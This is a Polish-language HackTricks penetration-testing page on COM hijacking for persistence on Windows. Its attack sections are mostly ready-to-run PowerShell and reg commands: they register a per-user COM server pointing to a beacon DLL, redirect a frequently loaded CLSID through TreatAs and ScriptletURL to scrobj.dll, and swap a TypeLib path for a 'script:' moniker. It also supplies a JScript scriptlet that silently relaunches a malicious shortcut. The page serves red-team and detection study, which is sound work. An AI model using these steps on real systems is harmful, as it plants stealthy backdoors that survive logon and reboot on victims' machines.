# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Wyszukiwanie nieistniejących komponentów COM

Ponieważ wartości HKCU mogą być modyfikowane przez użytkowników, **COM Hijacking** może być używany jako **mechanizm persistence**. Za pomocą `procmon` można łatwo znaleźć wyszukiwane rejestry COM, które jeszcze nie istnieją i mogłyby zostać utworzone przez atakującego. Klasyczne filtry:

- operacje **RegOpenKey**.
- gdzie _Result_ ma wartość **NAME NOT FOUND**.
- a _Path_ kończy się na **InprocServer32**.

Przydatne warianty podczas huntingu:

- Sprawdzaj również brakujące klucze **`LocalServer32`**. Niektóre klasy COM są serwerami out-of-process i uruchomią kontrolowany przez atakującego plik EXE zamiast DLL.
- Oprócz `InprocServer32` wyszukuj operacje rejestru **`TreatAs`** i **`ScriptletURL`**. Nowsze materiały dotyczące detekcji i opisy malware często je wskazują, ponieważ występują znacznie rzadziej niż standardowe rejestracje COM, a tym samym mają wysoką wartość sygnałową.
- Podczas klonowania rejestracji do HKCU skopiuj legalny **`ThreadingModel`** z oryginalnego `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32`. Użycie niewłaściwego modelu często powoduje nieprawidłową aktywację i sprawia, że hijacking staje się łatwy do wykrycia.<sup>[[3]](#references)</sup>
- W systemach 64-bitowych sprawdzaj zarówno widoki 64-bitowe, jak i 32-bitowe (`procmon.exe` vs `procmon64.exe`, `HKLM\Software\Classes` i `HKLM\Software\Classes\WOW6432Node`), ponieważ aplikacje 32-bitowe mogą rozwiązywać inną rejestrację COM.

Po wybraniu nieistniejącego COM, który ma zostać podszyty, wykonaj następujące polecenia. _Zachowaj ostrożność, jeśli zdecydujesz się podszyć COM ładowany co kilka sekund, ponieważ może to być nadmiernie uciążliwe._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Podatne na hijacking komponenty COM Task Scheduler

Windows Tasks używają Custom Triggers do wywoływania obiektów COM, a ponieważ są wykonywane przez Task Scheduler, łatwiej przewidzieć, kiedy zostaną uruchomione.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Sprawdzając wyniki, możesz wybrać taki, który będzie wykonywany **za każdym razem, gdy użytkownik się loguje**, na przykład.

Następnie wyszukując CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** w **HKEY\CLASSES\ROOT\CLSID**, a także w HKLM i HKCU, zwykle okaże się, że ta wartość nie istnieje w HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Następnie możesz po prostu utworzyć wpis HKCU i za każdym razem, gdy użytkownik się zaloguje, uruchomi się Twój backdoor.

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` pozwala emulować jeden CLSID za pomocą innego.<sup>[[4]](#references)</sup> Z perspektywy offensive oznacza to, że możesz pozostawić oryginalny CLSID bez zmian, utworzyć drugi CLSID per-user wskazujący na `scrobj.dll`, a następnie przekierować rzeczywisty obiekt COM do złośliwego obiektu za pomocą `HKCU\Software\Classes\CLSID\{Victim}\TreatAs`.

Jest to przydatne, gdy:

- aplikacja docelowa już tworzy stabilny CLSID podczas logowania lub uruchamiania aplikacji
- chcesz użyć przekierowania wyłącznie za pomocą rejestru zamiast zastępować oryginalny `InprocServer32`
- chcesz wykonać lokalny lub zdalny scriptlet `.sct` za pośrednictwem wartości `ScriptletURL`

Przykładowy workflow (zaadaptowany na podstawie publicznego tradecraftu Atomic Red Team oraz starszych badań nad nadużywaniem rejestru COM):
```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```
Uwagi:

- `scrobj.dll` odczytuje wartość `ScriptletURL` i wykonuje wskazany `.sct`, więc payload może pozostać jako plik lokalny albo być pobierany zdalnie przez HTTP/HTTPS.
- `TreatAs` jest szczególnie przydatne, gdy oryginalna rejestracja COM jest kompletna i stabilna w HKLM, ponieważ wystarczy niewielkie przekierowanie per-user zamiast odwzorowywania całego drzewa.
- Aby przeprowadzić walidację bez oczekiwania na naturalny trigger, możesz ręcznie utworzyć fałszywy ProgID/CLSID za pomocą `rundll32.exe -sta <ProgID-or-CLSID>`, jeśli docelowa klasa obsługuje aktywację STA.

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) definiują interfejsy COM i są ładowane za pomocą `LoadTypeLib()`. Gdy tworzona jest instancja serwera COM, system operacyjny może również załadować powiązany TypeLib, sprawdzając klucze rejestru w `HKCR\TypeLib\{LIBID}`. Jeśli ścieżka TypeLib zostanie zastąpiona przez **moniker**, np. `script:C:\...\evil.sct`, Windows wykona scriptlet podczas rozwiązywania TypeLib, zapewniając dyskretną persistence uruchamianą przy użyciu często dotykanych komponentów.

Zaobserwowano to w przypadku kontrolki Microsoft Web Browser (często ładowanej przez Internet Explorer, aplikacje osadzające WebBrowser, a nawet `explorer.exe`).<sup>[[1]](#references)[[2]](#references)</sup>

### Steps (PowerShell)

1) Zidentyfikuj TypeLib (LIBID) używany przez często wykorzystywany CLSID. Przykładowy CLSID często nadużywany w łańcuchach malware: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Skieruj ścieżkę TypeLib dla użytkownika na lokalny scriptlet za pomocą monikera `script:` (uprawnienia administratora nie są wymagane):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Umieść minimalny JScript `.sct`, który ponownie uruchamia główny payload (np. plik `.lnk` używany w początkowym łańcuchu):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Triggering – otwarcie IE, aplikacji osadzającej kontrolkę WebBrowser lub nawet rutynowa aktywność programu Explorer załaduje TypeLib i wykona scriptlet, ponownie uzbrajając łańcuch przy logowaniu/ponownym uruchomieniu.

Czyszczenie
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Uwagi
- Tę samą logikę można zastosować do innych komponentów COM o wysokiej częstotliwości użycia; zawsze najpierw rozwiąż rzeczywisty `LIBID` z `HKCR\CLSID\{CLSID}\TypeLib`.
- W systemach 64-bitowych można również utworzyć subkey `win64` dla konsumentów 64-bitowych.

## References

- [1] [Hijack the TypeLib – nowa technika persistence COM (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – kampania ZipLine: zaawansowany phishing wymierzony w firmy z USA](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [Ponowne omówienie COM Hijacking (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [Klucz CLSID (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)

{{#include ../../banners/hacktricks-training.md}}
